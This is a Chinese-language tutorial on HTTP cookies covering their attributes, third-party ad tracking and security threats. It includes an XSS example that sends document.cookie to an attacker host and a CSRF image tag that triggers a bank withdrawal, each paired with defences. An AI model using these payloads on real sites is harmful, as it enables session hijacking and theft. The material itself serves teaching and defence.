### 前言

网络早期最大的问题之一是如何管理状态。简而言之，服务器无法知道两个请求是否来自同一个浏览器。当时最简单的方法是在请求时，在页面中插入一些参数，并在下一个请求中传回参数。这需要使用包含参数的隐藏的表单，或者作为URL参数的一部分传递。这两个解决方案都手动操作，容易出错。

网景公司当时一名员工Lou Montulli，在1994年将“cookies”的概念应用于网络通信，用来解决用户网上购物的购物车历史记录，目前所有浏览器都支持cookies。

### cookie是什么
cookie翻译过来是“饼干，甜品”的意思，cookie在网络应用中到处存在，当我们浏览之前访问过的网站，网页中可能会显示：你好，王三少，这就会让我们感觉很亲切，像吃了一块很甜的饼干一样。

由于http是无状态的协议，一旦客户端和服务器的数据交换完毕，就会断开连接，再次请求，会重新连接，这就说明服务器单从网络连接上是没有办法知道用户身份的。怎么办呢？那就给每次新的用户请求时，给它颁发一个身份证（独一无二）吧，下次访问，必须带上身份证，这样服务器就会知道是谁来访问了，针对不同用户，做出不同的响应。，这就是Cookie的原理。

其实cookie是一个很小的文本文件，是浏览器储存在用户的机器上的。Cookie是纯文本，没有可执行代码。储存一些服务器需要的信息，每次请求站点，会发送相应的cookie，这些cookie可以用来辨别用户身份信息等作用。

<img src="images/cookie01.png">

如图所示,用户首次访问服务器，服务器会返回一个独一无二的识别码；id=23451，这样服务器可以用这个码跟踪记录用户的信息，（购物历史，地址信息等）。

cookie可以包含任意的信息，不仅仅是id，客户端会记录服务器返回来的Set-Cookie首部中的cookie内容。并将cookie存储在浏览器的cookie数据库中，当用户访问同一站点时，浏览器就会挑选当时该站点颁发的id=XXX的身份证（cookie），并在Cookie请求首部发送过去。

### cookie的类型
可以按照过期时间分为两类：会话cookie和持久cookie。会话cookie是一种临时cookie，用户退出浏览器，会话Cookie就会被删除了，持久cookie则会储存在硬盘里，保留时间更长，关闭浏览器，重启电脑，它依然存在，通常是持久性的cookie会维护某一个用户周期性访问服务器的配置文件或者登录信息。


> 持久cookie 设置一个特定的过期时间（Expires）或者有效期（Max-Age）

```
  Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2019 07:28:00 GMT;
```

### cookie的属性
#### cookie的域
产生Cookie的服务器可以向set-Cookie响应首部添加一个Domain属性来控制哪些站点可以看到那个cookie，例如下面：
```
  Set-Cookie: name="wang"; domain="m.zhuanzhuan.58.com"
```
如果用户访问的是m.zhuanzhuan.58.com那就会发送cookie: name="wang", 如果用户访问www.aaa.com（非zhuanzhuan.58.com）就不会发送这个Cookie。

#### cookie的路径 Path
Path属性可以为服务器特定文档指定Cookie，这个属性设置的url且带有这个前缀的url路径都是有效的。

例如：m.zhuanzhuan.58.com 和 m.zhaunzhuan.58.com/user/这两个url。
m.zhuanzhuan.58.com 设置cookie
```
  Set-cookie: id="123432";domain="m.zhuanzhuan.58.com";
```
m.zhaunzhuan.58.com/user/ 设置cookie：
```
  Set-cookie：user="wang", domain="m.zhuanzhuan.58.com"; path=/user/
```
但是访问其他路径m.zhuanzhuan.58.com/other/就会获得
```
  cookie: id="123432"
```
如果访问m.zhuanzhuan.58.com/user/就会获得
```
  cookie: id="123432"
  cookie: user="wang"
```
#### secure
设置了属性secure，cookie只有在https协议加密情况下才会发送给服务端。但是这并不是最安全的，由于其固有的不安全性，敏感信息也是不应该通过cookie传输的.

```
    Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT; Secure;
```

> chrome 52和firefox 52 开始不安全的（HTTP）是无法使用secure的：

### 操作Cookie

通过docuemnt.cookie可以设置和获取Cookie的值
```
document.cookie = "user=wang";
console.log(document.cookie);
```
> 禁止javascript操作cookie（为避免跨域脚本(xss)攻击，通过javascript的document.cookie无法访问带有HttpOnly标记的cookie。）

```
  Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2017 07:28:00 GMT; Secure; HttpOnly
```

### 第三方cookie

通常cookie的域和浏览器地址的域匹配，这被称为第一方cookie。那么第三方cookie就是cookie的域和地址栏中的域不匹配，这种cookie通常被用在第三方广告网站。为了跟踪用户的浏览记录，并且根据收集的用户的浏览习惯，给用户推送相关的广告。
<img src="images/cookie02.png">

如上图（a）：用户访问服务器1的一个页面index.html，这个页面和第三方广告网站合作，这个页面还有一张www.advertisement.com域名下的一张广告图ad1.jpg，当请求这张ad1.jpg图片的时候，www.advertisement.com这个服务器会给用户设置cookie
```
  Set-Cookie: user="wang";like="a"; domain="advertisement.com"
```
记录用户的浏览记录，分配一个user来表示用户的身份。

图（b）：用户访问服务器2的一个index.html页面，这个页面也和同一家广告商合作，这个页面也包含一张www.advertisement.com域名下的一张广告图ad2.jpg，当请求这张ad2.jpg图片的时候，浏览器就会向www.advertisement.com发送cookie
```
  Cookie:  user="wang"; like="a";
```
www.advertisement.com收到浏览器发送的cookie识别了用户的身份，同时又把这个页面用户的浏览数据设置cookie
```
  Set-Cookie: buy="b"; domain="advertisement.com"
```
图（c）：很巧，用户访问服务器3的一个index.html页面，这个页面也和那一家广告商合作，这个页面也包含一张www.advertisement.com域名下的一张广告图ad3.jpg，当请求这张ad3.jpg图片的时候，浏览器就会向www.advertisement.com发送cookie
```
  Cookie:  user="wang"; like="a"; buy="b"
```
这样广告公司就可以根据用户的浏览习惯，给用户推送合适的广告。

### 安全
多数网站使用cookie作为用户会话的唯一标识，因为其他的方法具有限制和漏洞。如果一个网站使用cookies作为会话标识符，攻击者可以通过窃取一套用户的cookies来冒充用户的请求。从服务器的角度，它是没法分辨用户和攻击者的，因为用户和攻击者拥有相同的身份验证。
下面介绍几种cookie盗用和会话劫持的例子：

#### 网络窃听
网络上的流量可以被网络上任何计算机拦截，特别是未加密的开放式WIFI。这种流量包含在普通的未加密的HTTP清求上发送Cookie。在未加密的情况下，攻击者可以读取网络上的其他用户的信息，包含HTTP Cookie的全部内容，以便进行中间的攻击。比如：拦截cookie来冒充用户身份执行恶意任务（银行转账等）。

解决办法：服务器可以设置secure属性的cookie，这样就只能通过https的方式来发送cookies了。

#### DNS缓存中毒

如果攻击者可以使[DNS缓存中毒](http://https://en.wikipedia.org/wiki/DNS_spoofing/)，那么攻击者就可以访问用户的Cookie了，例如：攻击者使用DNS中毒来创建一个虚拟的NDS服务h123456.www.demo.com指向攻击者服务器的ip地址。然后攻击者可以从服务器           h123456.www.demo.com/img_01.png 发布图片。用户访问这个图片，由于 www.demo.com和h123456.www.demo.com是同一个子域，所以浏览器会把用户的与www.demo.com相关的cookie都会发送到h123456.www.demo.com这个服务器上，这样攻击者就会拿到用户的cookie搞事情。

一般情况下是不会发生这种情况，通常是网络供应商错误。

#### 跨站点脚本XSS
使用跨站点脚本技术可以窃取cookie。当网站允许使用javascript操作cookie的时候，就会发生攻击者发布恶意代码攻击用户的会话，同时可以拿到用户的cookie信息。

例子：

```
<a href="#" onclick=`window.location=http://abc.com?cookie=${docuemnt.cookie}`>领取红包</a>
```
当用户点击这个链接的时候，浏览器就会执行onclick里面的代码，结果这个网站用户的cookie信息就会被发送到abc.com攻击者的服务器。攻击者同样可以拿cookie搞事情。

解决办法：可以通过cookie的HttpOnly属性，设置了HttpOnly属性，javascript代码将不能操作cookie。

#### 跨站请求伪造CSRF

例如，SanShao可能正在浏览其他用户XiaoMing发布消息的聊天论坛。假设XiaoMing制作了一个引用ShanShao银行网站的HTML图像元素，例如，
```
<img  src = "http://www.bank.com/withdraw?user=SanShao&amount=999999&for=XiaoMing" >
```
如果SanShao的银行将其认证信息保存在cookie中，并且cookie尚未过期，(当然是没有其他验证身份的东西)，那么SanShao的浏览器尝试加载该图片将使用他的cookie提交提款表单，从而在未经SanShao批准的情况下授权交易。

解决办法：增加其他信息的校验（手机验证码，或者其他盾牌）。
